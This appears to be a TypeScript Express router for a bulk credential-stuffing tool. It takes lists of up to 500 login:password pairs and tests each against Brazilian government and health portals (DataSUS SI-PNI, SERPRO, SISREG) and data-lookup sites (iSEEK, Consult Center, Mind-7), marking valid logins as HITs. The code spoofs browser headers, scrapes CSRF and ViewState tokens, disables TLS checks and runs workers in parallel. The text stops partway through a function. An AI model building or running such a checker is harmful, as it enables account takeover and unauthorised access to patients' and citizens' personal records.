import { Router, type IRouter } from "express";
import { createHash }  from "node:crypto";
import { execFile }    from "node:child_process";
import { unlinkSync }  from "node:fs";

const router: IRouter = Router();

// ── curl-based HTTP helper ────────────────────────────────────────────────────
// Node.js's built-in fetch (undici) times out on DataSUS (cloud-IP block).
// curl uses the system network stack which has no such restriction.
// We shell out to curl for DataSUS requests only.

interface CurlResult {
  statusCode: number;
  headers:    Record<string, string>;
  body:       string;
  location:   string; // value of Location header (from redirect), if any
}

function runCurl(argv: string[], timeoutMs = 15_000): Promise<CurlResult> {
  // Base args: silent + dump headers to stdout + timeout
  const args = ["-s", "--max-time", String(Math.ceil(timeoutMs / 1000)), "-D", "-", ...argv];

  return new Promise((resolve, reject) => {
    const child = execFile("curl", args, { maxBuffer: 8 * 1024 * 1024 }, (err, stdout) => {
      // curl exit-code ≠ 0 is ok as long as we got output (e.g. 302 with --max-redirs 0)
      if (!stdout && err) return reject(new Error(err.message.split("\n")[0]));

      // Split at first blank line separating headers from body
      // (may have multiple header blocks if curl followed a redirect for the GET phase)
      // We want the LAST header block.
      const blocks = stdout.split(/\r?\n\r?\n/);
      // Find last block starting with HTTP/
      let rawHdr = "";
      let body   = "";
      for (let i = blocks.length - 1; i >= 0; i--) {
        if (blocks[i].trimStart().startsWith("HTTP/")) {
          rawHdr = blocks[i];
          body   = blocks.slice(i + 1).join("\r\n\r\n");
          break;
        }
      }

      const lines      = rawHdr.split(/\r?\n/);
      const statusLine = lines[0] ?? "";
      const statusCode = parseInt(statusLine.split(" ")[1] ?? "0", 10);

      const headers: Record<string, string> = {};
      for (const line of lines.slice(1)) {
        const idx = line.indexOf(":");
        if (idx === -1) continue;
        const key = line.slice(0, idx).trim().toLowerCase();
        const val = line.slice(idx + 1).trim();
        if (!headers[key]) headers[key] = val; // first occurrence wins
      }

      resolve({ statusCode, headers, body, location: headers["location"] ?? "" });
    });

    setTimeout(() => {
      try { child.kill("SIGKILL"); } catch { /**/ }
      reject(new Error("CURL_TIMEOUT"));
    }, timeoutMs + 3_000);
  });
}

// ── Types ─────────────────────────────────────────────────────────────────────
export type CheckStatus = "HIT" | "FAIL" | "ERROR";
export type CheckerTarget = "iseek" | "datasus" | "sipni" | "consultcenter" | "mind7" | "serpro" | "sisreg" | "credilink" | "serasa";

export interface CheckResult {
  credential: string;
  login:      string;
  status:     CheckStatus;
  detail:     string;
}

export interface CheckerBulkResponse {
  total:   number;
  hits:    number;
  fails:   number;
  errors:  number;
  results: CheckResult[];
}

// ── Shared helpers ────────────────────────────────────────────────────────────
const MOBILE_UA  = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36";
const DESKTOP_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";
const OPERA_UA   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0";

function parseCookieJar(headers: Headers): string {
  const raw = headers.getSetCookie?.() ?? [];
  return raw.map(c => c.split(";")[0]).join("; ");
}

/** Parse credentials from any format — supports email:pass, user:pass, newline/comma/semicolon separated */
const MAX_BULK = 500;
export function parseCredentials(raw: string): Array<{ login: string; password: string }> {
  return raw
    .split(/[\n,;|]+/)
    .map(l => l.trim())
    .filter(Boolean)
    .slice(0, MAX_BULK)
    .map(line => {
      const idx = line.indexOf(":");
      if (idx === -1) return null;
      const login    = line.slice(0, idx).trim();
      const password = line.slice(idx + 1).trim();
      if (!login || !password) return null;
      return { login, password };
    })
    .filter((x): x is { login: string; password: string } => x !== null);
}

const sleep = (ms: number) => new Promise<void>(r => setTimeout(r, ms));

// ═══════════════════════════════════════════════════════════════════════════════
//  iSEEK CHECKER — https://iseek.pro/login
//  Logic: GET → extract CSRF _token → POST creds → check redirect location
// ═══════════════════════════════════════════════════════════════════════════════
const ISEEK_URL = "https://iseek.pro/login";
const ISEEK_TIMEOUT = 15_000;

const ISEEK_HEADERS: Record<string, string> = {
  "User-Agent":      DESKTOP_UA,
  "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
  "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
};

function extractCsrfToken(html: string): string | null {
  const m1 = html.match(/name=["']_token["'][^>]*value=["']([^"']+)["']/);
  if (m1) return m1[1];
  const m2 = html.match(/value=["']([^"']+)["'][^>]*name=["']_token["']/);
  if (m2) return m2[1];
  const m3 = html.match(/_token[^>]*value=["']([A-Za-z0-9+/=]{20,80})["']/);
  if (m3) return m3[1];
  return null;
}

async function checkIseek(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;

  // Step 1: GET login page — grab CSRF token + cookies
  let getResp: Response;
  try {
    getResp = await fetch(ISEEK_URL, {
      headers:  { ...ISEEK_HEADERS },
      redirect: "follow",
      signal:   AbortSignal.timeout(ISEEK_TIMEOUT),
    });
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
  }

  const html      = await getResp.text().catch(() => "");
  const cookieJar = parseCookieJar(getResp.headers);
  const token     = extractCsrfToken(html);

  if (!token) return { credential, login, status: "ERROR", detail: "NO_CSRF_TOKEN" };

  // Step 2: POST credentials (no redirect follow — inspect Location header)
  const body = new URLSearchParams({ _token: token, email: login, password });
  const postHeaders: Record<string, string> = {
    ...ISEEK_HEADERS,
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer":      ISEEK_URL,
    "Origin":       "https://iseek.pro",
    ...(cookieJar ? { "Cookie": cookieJar } : {}),
  };

  let postResp: Response;
  try {
    postResp = await fetch(ISEEK_URL, {
      method:   "POST",
      headers:  postHeaders,
      body:     body.toString(),
      redirect: "manual",
      signal:   AbortSignal.timeout(ISEEK_TIMEOUT),
    });
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
  }

  if (postResp.status >= 301 && postResp.status <= 308) {
    const loc = postResp.headers.get("location") ?? "";
    if (loc && !loc.includes("/login")) {
      return { credential, login, status: "HIT", detail: loc.startsWith("/") ? `https://iseek.pro${loc}` : loc };
    }
    return { credential, login, status: "FAIL", detail: loc || "redirect_back_to_login" };
  }

  // Fallback: follow redirects and check final URL
  try {
    const final = await fetch(ISEEK_URL, {
      method:   "POST",
      headers:  postHeaders,
      body:     body.toString(),
      redirect: "follow",
      signal:   AbortSignal.timeout(ISEEK_TIMEOUT),
    });
    const finalUrl = final.url;
    if (finalUrl && !finalUrl.includes("/login")) {
      return { credential, login, status: "HIT", detail: finalUrl };
    }
    return { credential, login, status: "FAIL", detail: finalUrl || "login_page" };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `POST_FOLLOW:${String(e)}` };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  DATASUS / SI-PNI CHECKER — https://sipni.datasus.gov.br
//  Logic: GET page → extract ViewState + form ID → SHA-512 password → POST → check
// ═══════════════════════════════════════════════════════════════════════════════
const DATASUS_URL = "https://sipni.datasus.gov.br/si-pni-web/faces/inicio.jsf";
const DATASUS_TIMEOUT = 15_000;

const DATASUS_HEADERS: Record<string, string> = {
  "User-Agent": MOBILE_UA,
  "Accept":     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
};

function sha512(text: string): string {
  return createHash("sha512").update(text, "ascii").digest("hex");
}

function sha256(text: string): string {
  return createHash("sha256").update(text).digest("hex");
}

function extractViewState(html: string): string {
  // Standard JSF ViewState hidden input
  const m = html.match(/name=["']javax\.faces\.ViewState["'][^>]*value=["']([^"']+)["']/);
  if (m) return m[1];
  const m2 = html.match(/value=["']([^"']+)["'][^>]*name=["']javax\.faces\.ViewState["']/);
  if (m2) return m2[1];
  return "j_id1"; // fallback default
}

function extractFormId(html: string): string {
  // Try known form IDs: j_idt23, j_idt26, etc.
  const knownIds = ["j_idt23", "j_idt26", "loginForm", "j_idt25", "j_idt24"];
  for (const id of knownIds) {
    if (html.includes(`id="${id}"`)) return id;
  }
  // Fallback: first form with an id
  const m = html.match(/<form[^>]+id=["']([^"']+)["']/);
  if (m) return m[1];
  return "j_idt23";
}

function extractSubmitId(html: string, formId: string): string {
  // Try to find submit button inside the form
  const m = html.match(new RegExp(`${formId}:([\\w]+)[^>]+type=["']submit["']`));
  if (m) return `${formId}:${m[1]}`;
  const m2 = html.match(/id=["']([^"']+)["'][^>]*type=["']submit["']/);
  if (m2) return m2[1];
  return `${formId}:j_idt32`; // default fallback from Python code
}

async function checkDataSUS(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  // Unique cookie jar per session so parallel checks don't share cookies
  const cookieFile = `/tmp/datasus_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;

  try {
    // ── Step 1: GET login page, save cookies ──────────────────────────────
    let getResult: CurlResult;
    try {
      getResult = await runCurl([
        "-c", cookieFile,                    // save cookies to jar
        "-H", `User-Agent: ${MOBILE_UA}`,
        DATASUS_URL,
      ], DATASUS_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
    }

    if (getResult.statusCode !== 200) {
      return { credential, login, status: "ERROR", detail: `HTTP_${getResult.statusCode}` };
    }

    const html      = getResult.body;
    const viewState = extractViewState(html);
    const formId    = extractFormId(html);
    const submitId  = extractSubmitId(html, formId);
    const senhaHash = sha512(password);

    // Build POST body
    const postPairs = [
      [formId, formId],
      ["javax.faces.ViewState", viewState],
      [`${formId}:usuario`, login],
      [`${formId}:senha`, senhaHash],
      [submitId, submitId.includes(":") ? submitId.split(":")[1] : submitId],
    ];
    // Escape each value for shell single-quote safety
    const postData = postPairs
      .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
      .join("&");

    // ── Step 2: POST (no redirect follow — inspect Location header) ────────
    let postResult: CurlResult;
    try {
      postResult = await runCurl([
        "-b", cookieFile,                                    // send cookies from jar
        "-H", `User-Agent: ${MOBILE_UA}`,
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", "Origin: https://sipni.datasus.gov.br",
        "-H", `Referer: ${DATASUS_URL}`,
        "--data-raw", postData,                              // POST body (no shell quoting issues)
        "--max-redirs", "0",                                 // inspect Location header manually
        DATASUS_URL,
      ], DATASUS_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
    }

    // 302 redirect away from inicio.jsf = LIVE
    const code = postResult.statusCode;
    const loc  = postResult.location;
    if (code >= 301 && code <= 308) {
      if (loc && !loc.includes("inicio.jsf")) {
        return { credential, login, status: "HIT", detail: loc };
      }
      return { credential, login, status: "FAIL", detail: "redirect_back_to_login" };
    }

    // No redirect — check body keywords
    const body2 = postResult.body.toLowerCase();
    if (body2.includes("usu") && (body2.includes("ou senha inv") || body2.includes("senha incorreta"))) {
      return { credential, login, status: "FAIL", detail: "senha_invalida" };
    }
    if (body2.includes("pacienteform") || body2.includes("listapacientetable") || body2.includes("bem-vindo")) {
      return { credential, login, status: "HIT", detail: "dashboard_found" };
    }
    if (body2.includes("inicio.jsf") || body2.includes('type="password"') || body2.includes("type='password'")) {
      return { credential, login, status: "FAIL", detail: "still_on_login" };
    }

    return { credential, login, status: "ERROR", detail: `UNKNOWN_HTTP${code}` };
  } finally {
    // Clean up cookie jar
    try { unlinkSync(cookieFile); } catch { /**/ }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  SERPRO CHECKER — https://radar.serpro.gov.br
//  Logic: POST JSON with Android UA → check response for "token" field
//  Note: API uses self-signed cert; curl -k skips verification.
// ═══════════════════════════════════════════════════════════════════════════════
const SERPRO_URL     = "https://radar.serpro.gov.br/core-rest/gip-rest/auth/loginTalonario";
const SERPRO_TIMEOUT = 15_000;
const SERPRO_UA      = "Dalvik/2.1.0 (Linux; Android 14)";

async function checkSerpro(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const body       = JSON.stringify({ imei: "", latitude: 0, longitude: 0, password, username: login });

  try {
    const result = await runCurl([
      "-k", "--compressed",                            // ignore self-signed cert + auto-decompress gzip
      "-X", "POST",
      "-H", `User-Agent: ${SERPRO_UA}`,
      "-H", "Connection: Keep-Alive",
      "-H", "Content-Type: application/json",
      "-d", body,
      SERPRO_URL,
    ], SERPRO_TIMEOUT);

    const text = result.body.trim();

    // Empty or non-JSON (WAF block / gateway error)
    if (!text || result.statusCode === 0 || result.statusCode >= 502) {
      return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
    }

    // WAF / firewall rejection (HTML response instead of JSON)
    if (text.startsWith("<") || text.includes("Request Rejected") || text.includes("<html")) {
      return { credential, login, status: "ERROR", detail: "WAF_BLOCKED" };
    }

    let json: Record<string, unknown>;
    try { json = JSON.parse(text); } catch { return { credential, login, status: "ERROR", detail: "INVALID_JSON" }; }

    // HIT: response contains a JWT token
    if (json.token && typeof json.token === "string") {
      return { credential, login, status: "HIT", detail: "token_ok" };
    }

    // Expired / blocked account (has stok but no token)
    if (json.stok) {
      return { credential, login, status: "FAIL", detail: `stok_code_${json.code ?? "?"}` };
    }

    // Parse friendly message from API response
    const mensagem = String(json.mensagem ?? json.message ?? json.erro ?? "").trim();

    // Explicit error codes
    const code = String(json.code ?? json.status ?? "").toLowerCase();
    if (code.includes("invalid") || code.includes("wrong") || code.includes("401")) {
      return { credential, login, status: "FAIL", detail: mensagem || `auth_failed:${code}` };
    }

    if (result.statusCode === 401 || result.statusCode === 403) {
      return { credential, login, status: "FAIL", detail: mensagem || `http_${result.statusCode}` };
    }

    // User not found or other API error = FAIL
    if (mensagem) {
      return { credential, login, status: "FAIL", detail: mensagem.slice(0, 100) };
    }

    return { credential, login, status: "FAIL", detail: text.slice(0, 120) };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `SERPRO_EXCEPTION:${String(e)}` };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  SISREG III CHECKER — https://sisregiii.saude.gov.br
//  Logic: POST SHA-256 hashed password → parse HTML for profile markers
// ═══════════════════════════════════════════════════════════════════════════════
const SISREG_URL     = "https://sisregiii.saude.gov.br/";
const SISREG_TIMEOUT = 20_000;

async function checkSisreg(login: string, password: string): Promise<CheckResult> {
  const credential  = `${login}:${password}`;
  const senhaHash   = sha256(password);

  const postBody = [
    `usuario=${encodeURIComponent(login)}`,
    `senha=`,
    `senha_256=${senhaHash}`,
    `etapa=ACESSO`,
    `logout=`,
  ].join("&");

  try {
    const result = await runCurl([
      "-k", "--compressed",
      "-X", "POST",
      "-H", "Host: sisregiii.saude.gov.br",
      "-H", "Connection: keep-alive",
      "-H", "Cache-Control: max-age=0",
      "-H", `sec-ch-ua: "Not A(Brand";v="99", "Opera";v="107", "Chromium";v="121"`,
      "-H", "sec-ch-ua-mobile: ?0",
      "-H", `sec-ch-ua-platform: "Windows"`,
      "-H", "Upgrade-Insecure-Requests: 1",
      "-H", `Origin: ${SISREG_URL}`,
      "-H", "Content-Type: application/x-www-form-urlencoded",
      "-H", `User-Agent: ${OPERA_UA}`,
      "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
      "-H", "Sec-Fetch-Site: same-origin",
      "-H", "Sec-Fetch-Mode: navigate",
      "-H", "Sec-Fetch-User: ?1",
      "-H", "Sec-Fetch-Dest: document",
      "-H", `Referer: ${SISREG_URL}cgi-bin/index?logout=1`,
      "-H", "Accept-Language: pt-BR,pt;q=0.9",
      "--data-raw", postBody,
      `${SISREG_URL}`,
    ], SISREG_TIMEOUT);

    if (result.statusCode === 0 || result.statusCode >= 502) {
      return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
    }

    const body = result.body;

    // ── Capture LIMITADO message <CENTER><font color="red"><B>...</B> ─────────
    const limitadoMatch = body.match(/<CENTER><font[^>]*color=["']?red["']?[^>]*><B>(.*?)<\/B>/i);
    const limitado = limitadoMatch ? limitadoMatch[1].trim().slice(0, 80) : null;

    // ── Capture UNIDADE ────────────────────────────────────────────────────────
    const unidadeMatch = body.match(/Unidade:[\s\S]{0,200}?&nbsp;([^<]+)<\/font>/) ||
                         body.match(/Unidade:(.*?)<\/[Dd][Ii][Vv]>/);
    const unidade = unidadeMatch
      ? unidadeMatch[1].replace(/&nbsp;/g, " ").replace(/<[^>]+>/g, "").trim().slice(0, 80)
      : null;

    const extraInfo = [unidade ? `Unidade: ${unidade}` : null, limitado ? `Msg: ${limitado}` : null]
      .filter(Boolean).join(" | ");

    // ── FAIL markers ──────────────────────────────────────────────────────────
    if (body.includes("Login ou senha incorreto(s).")) {
      return { credential, login, status: "FAIL", detail: limitado ? `senha_invalida | ${limitado}` : "senha_invalida" };
    }
    if (body.includes("Este operador foi desativado pelo administrador.")) {
      return { credential, login, status: "FAIL", detail: extraInfo || "conta_desativada" };
    }

    // ── CUSTOM: access restricted by day/time — account IS valid ─────────────
    if (body.includes("Acesso n") && body.includes("o permitido")) {
      return { credential, login, status: "HIT", detail: extraInfo || "acesso_restrito" };
    }

    // ── HIT markers ───────────────────────────────────────────────────────────
    const hitMarkers = ["<p>Perfil</p>", "logout", "Sair", "Principal", "Cadastro"];
    const isHit = hitMarkers.some(m => body.includes(m));
    if (isHit) {
      return { credential, login, status: "HIT", detail: extraInfo || "login_ok" };
    }

    // ── Fallback ──────────────────────────────────────────────────────────────
    if (body.length < 500) {
      return { credential, login, status: "ERROR", detail: "resposta_muito_curta" };
    }

    return { credential, login, status: "FAIL", detail: extraInfo || "nenhum_marcador" };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `SISREG_EXCEPTION:${String(e)}` };
  }
}

// ── Concurrency pool (no deps needed) ────────────────────────────────────────
// Runs `fn` for every item with at most `concurrency` tasks in parallel,
// preserving result order. Fast replacement for p-limit.
// Each worker catches unexpected throws so the pool NEVER stops early.
async function pMap<T, R>(
  items:       T[],
  fn:          (item: T, idx: number) => Promise<R>,
  concurrency: number,
  onResult?:   (result: R, index: number) => void,
): Promise<R[]> {
  const results: R[] = new Array(items.length);
  let next = 0;
  let done = 0;
  const worker = async () => {
    while (next < items.length) {
      const i = next++;
      try {
        results[i] = await fn(items[i], i);
      } catch (e) {
        // Safety net — mappers should never throw, but if they do the pool continues
        const item = items[i] as Record<string, string>;
        const login = item.login ?? "unknown";
        const pw    = item.password ?? "";
        results[i]  = { credential: `${login}:${pw}`, login, status: "ERROR", detail: `UNCAUGHT:${String(e)}` } as R;
      }
      done++;
      onResult?.(results[i], done);
    }
  };
  await Promise.all(Array.from({ length: Math.min(concurrency, items.length) }, worker));
  return results;
}

// ═══════════════════════════════════════════════════════════════════════════════
//  CONSULT CENTER CHECKER — https://sistema.consultcenter.com.br/users/login
//  Logic: GET page → grab CAKEPHP session cookie → POST creds → detect error/success
// ═══════════════════════════════════════════════════════════════════════════════
const CC_URL     = "https://sistema.consultcenter.com.br/users/login";
const CC_TIMEOUT = 20_000;

async function checkConsultCenter(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const cookieFile = `/tmp/cc_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;

  try {
    // ── Step 1: GET login page — obtain session cookie ─────────────────────
    let getResult: CurlResult;
    try {
      getResult = await runCurl([
        "-c", cookieFile,
        "-H", `User-Agent: ${DESKTOP_UA}`,
        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "-H", "Accept-Language: pt-BR,pt;q=0.9,en;q=0.8",
        CC_URL,
      ], CC_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
    }

    if (getResult.statusCode === 0 || getResult.statusCode >= 500) {
      return { credential, login, status: "ERROR", detail: `GET_HTTP_${getResult.statusCode}` };
    }

    // ── Step 2: POST credentials — check for error flash or redirect ────────
    const postBody = [
      `_method=POST`,
      `data%5BUsuarioLogin%5D%5Busername%5D=${encodeURIComponent(login)}`,
      `data%5BUsuarioLogin%5D%5Bpassword%5D=${encodeURIComponent(password)}`,
    ].join("&");

    let postResult: CurlResult;
    try {
      postResult = await runCurl([
        "-b", cookieFile,
        "-H", `User-Agent: ${DESKTOP_UA}`,
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "-H", "Accept-Language: pt-BR,pt;q=0.9,en;q=0.8",
        "-H", `Referer: ${CC_URL}`,
        "-H", "Origin: https://sistema.consultcenter.com.br",
        "--data-raw", postBody,
        "--max-redirs", "0",  // do NOT follow — inspect Location header manually
        CC_URL,
      ], CC_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
    }

    const body     = postResult.body;
    const location = postResult.location;

    // Success path 1: redirect to a non-login page
    if (postResult.statusCode >= 301 && postResult.statusCode <= 308 && location) {
      if (!location.includes("/users/login")) {
        const hitUrl = location.startsWith("/")
          ? `https://sistema.consultcenter.com.br${location}`
          : location;
        return { credential, login, status: "HIT", detail: hitUrl };
      }
      return { credential, login, status: "FAIL", detail: "redirect_back_to_login" };
    }

    // Success path 2: 200 response without error flash (rare, but some CakePHP apps)
    if (!body.includes("alert-danger") && !body.includes("incorretos") && !body.includes("Usuário e senha")) {
      if (body.includes("Bem-vindo") || body.includes("logout") || body.includes("Sair")) {
        return { credential, login, status: "HIT", detail: "https://sistema.consultcenter.com.br/dashboard" };
      }
    }

    // Fail: explicit error flash
    if (body.includes("alert-danger") || body.includes("incorretos") || body.includes("Usuário e senha")) {
      return { credential, login, status: "FAIL", detail: "credentials_invalid" };
    }

    return { credential, login, status: "FAIL", detail: "unknown_response" };
  } finally {
    try { unlinkSync(cookieFile); } catch { /* ok */ }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  MIND-7 CHECKER — https://mind-7.org/acesso/
//  Note: site is behind Cloudflare managed JS challenge (not bypassed via curl).
//  All attempts will return ERROR:CLOUDFLARE_CHALLENGE.
// ═══════════════════════════════════════════════════════════════════════════════
const MIND7_URL     = "https://mind-7.org/acesso/";
const MIND7_TIMEOUT = 15_000;

async function checkMind7(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const cookieFile = `/tmp/m7_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;

  try {
    let getResult: CurlResult;
    try {
      getResult = await runCurl([
        "-c", cookieFile,
        "-H", `User-Agent: ${DESKTOP_UA}`,
        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "-H", "Accept-Language: pt-BR,pt;q=0.9,en;q=0.8",
        "-H", "Sec-CH-UA: \"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\"",
        "-H", "Sec-CH-UA-Mobile: ?0",
        "-H", "Sec-CH-UA-Platform: \"Windows\"",
        "-H", "Sec-Fetch-Dest: document",
        "-H", "Sec-Fetch-Mode: navigate",
        "-H", "Sec-Fetch-Site: none",
        MIND7_URL,
      ], MIND7_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
    }

    // Detect Cloudflare challenge
    const isCFChallenge =
      getResult.statusCode === 403 ||
      getResult.statusCode === 503 ||
      getResult.body.includes("_cf_chl_opt") ||
      getResult.body.includes("cf-mitigated") ||
      getResult.body.includes("Just a moment") ||
      getResult.body.includes("Enable JavaScript and cookies");

    if (isCFChallenge) {
      return { credential, login, status: "ERROR", detail: "CLOUDFLARE_CHALLENGE" };
    }

    // If we somehow got past CF, try to POST
    const postBody = `username=${encodeURIComponent(login)}&password=${encodeURIComponent(password)}`;
    let postResult: CurlResult;
    try {
      postResult = await runCurl([
        "-b", cookieFile,
        "-H", `User-Agent: ${DESKTOP_UA}`,
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", `Referer: ${MIND7_URL}`,
        "-H", "Origin: https://mind-7.org",
        "--data-raw", postBody,
        "--max-redirs", "5",
        MIND7_URL,
      ], MIND7_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
    }

    const loc = postResult.location;
    if (loc && !loc.includes("/acesso") && !loc.includes("/login")) {
      return { credential, login, status: "HIT", detail: loc };
    }
    return { credential, login, status: "FAIL", detail: "credentials_invalid" };
  } finally {
    try { unlinkSync(cookieFile); } catch { /* ok */ }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  SIPNI CHECKER (v2) — https://sipni.datasus.gov.br (4-step JSF AJAX flow)
//  Logic: GET page → partial AJAX POST 1 → update ViewState → partial AJAX POST 2
//         → follow redirect XML → GET pacientes page → verify markers
// ═══════════════════════════════════════════════════════════════════════════════
const SIPNI_URL          = "https://sipni.datasus.gov.br/si-pni-web/faces/inicio.jsf";
const SIPNI_PACIENTES    = "https://sipni.datasus.gov.br/si-pni-web/faces/paciente/listarPaciente.jsf";
const SIPNI_TIMEOUT      = 25_000;

async function checkSipni(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const cookieFile = `/tmp/sipni_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;

  try {
    // ── Step 1: GET login page ────────────────────────────────────────────────
    let getResult: CurlResult;
    try {
      getResult = await runCurl([
        "-k", "--compressed",
        "-c", cookieFile,
        "-H", `User-Agent: ${MOBILE_UA}`,
        "-H", "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
        "-H", "Connection: keep-alive",
        "-H", "DNT: 1",
        SIPNI_URL,
      ], SIPNI_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
    }

    if (getResult.statusCode !== 200) {
      return { credential, login, status: "ERROR", detail: `HTTP_${getResult.statusCode}` };
    }

    const html      = getResult.body;
    const viewState = extractViewState(html);
    const formId    = extractFormId(html);
    const submitId  = extractSubmitId(html, formId);
    const senhaHash = sha512(password);

    if (!formId || !submitId) {
      return { credential, login, status: "ERROR", detail: "NO_FORM_FOUND" };
    }

    // ── Step 2: Partial AJAX POST 1 (authenticate) ───────────────────────────
    const ajaxBody1 = [
      "javax.faces.partial.ajax=true",
      `javax.faces.source=${encodeURIComponent(submitId)}`,
      `javax.faces.partial.execute=${encodeURIComponent(submitId)}`,
      "javax.faces.behavior.event=click",
      "javax.faces.partial.event=click",
      `${encodeURIComponent(formId)}=${encodeURIComponent(formId)}`,
      `javax.faces.ViewState=${encodeURIComponent(viewState)}`,
      `${encodeURIComponent(`${formId}:usuario`)}=${encodeURIComponent(login)}`,
      `${encodeURIComponent(`${formId}:senha`)}=${encodeURIComponent(senhaHash)}`,
      `${encodeURIComponent(submitId)}=${encodeURIComponent(submitId)}`,
      "AJAXREQUEST=_viewRoot",
    ].join("&");

    let post1: CurlResult;
    try {
      post1 = await runCurl([
        "-k", "--compressed",
        "-b", cookieFile, "-c", cookieFile,
        "-H", `User-Agent: ${MOBILE_UA}`,
        "-H", "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
        "-H", `Origin: https://sipni.datasus.gov.br`,
        "-H", `Referer: ${SIPNI_URL}`,
        "-H", "X-Requested-With: XMLHttpRequest",
        "-H", "Faces-Request: partial/ajax",
        "-H", "Accept: application/xml, text/xml, */*; q=0.01",
        "--data-raw", ajaxBody1,
        "--max-redirs", "0",
        SIPNI_URL,
      ], SIPNI_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `AJAX1_ERROR:${String(e)}` };
    }

    const xml1 = post1.body;

    // Detect wrong credentials early
    if (xml1.toLowerCase().includes("usu") && xml1.toLowerCase().includes("ou senha inv")) {
      return { credential, login, status: "FAIL", detail: "usuario_ou_senha_invalidos" };
    }
    if (xml1.toLowerCase().includes("acesso negado") || xml1.toLowerCase().includes("bloqueado")) {
      return { credential, login, status: "ERROR", detail: "BLOCK_AJAX1" };
    }

    // Extract updated ViewState from XML response
    let newViewState = viewState;
    const vsFromCData = xml1.match(/<update[^>]+javax\.faces\.ViewState[^>]*><!\[CDATA\[(.*?)\]\]><\/update>/);
    const vsFromAttr  = xml1.match(/id="javax\.faces\.ViewState"\s+value="([^"]+)"/);
    if (vsFromCData)    newViewState = vsFromCData[1];
    else if (vsFromAttr) newViewState = vsFromAttr[1];

    // ── Step 3: Partial AJAX POST 2 (complete login) ─────────────────────────
    const ajaxBody2 = [
      "javax.faces.partial.ajax=true",
      `javax.faces.source=${encodeURIComponent(submitId)}`,
      "javax.faces.partial.execute=%40all",
      `${encodeURIComponent(submitId)}=${encodeURIComponent(submitId)}`,
      `${encodeURIComponent(formId)}=${encodeURIComponent(formId)}`,
      `javax.faces.ViewState=${encodeURIComponent(newViewState)}`,
      `${encodeURIComponent(`${formId}:usuario`)}=${encodeURIComponent(login)}`,
      `${encodeURIComponent(`${formId}:senha`)}=${encodeURIComponent(senhaHash)}`,
    ].join("&");

    let post2: CurlResult;
    try {
      post2 = await runCurl([
        "-k", "--compressed",
        "-b", cookieFile, "-c", cookieFile,
        "-H", `User-Agent: ${MOBILE_UA}`,
        "-H", "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
        "-H", `Origin: https://sipni.datasus.gov.br`,
        "-H", `Referer: ${SIPNI_URL}`,
        "-H", "X-Requested-With: XMLHttpRequest",
        "-H", "Faces-Request: partial/ajax",
        "-H", "Accept: application/xml, text/xml, */*; q=0.01",
        "--data-raw", ajaxBody2,
        "--max-redirs", "0",
        SIPNI_URL,
      ], SIPNI_TIMEOUT);
    } catch (e) {
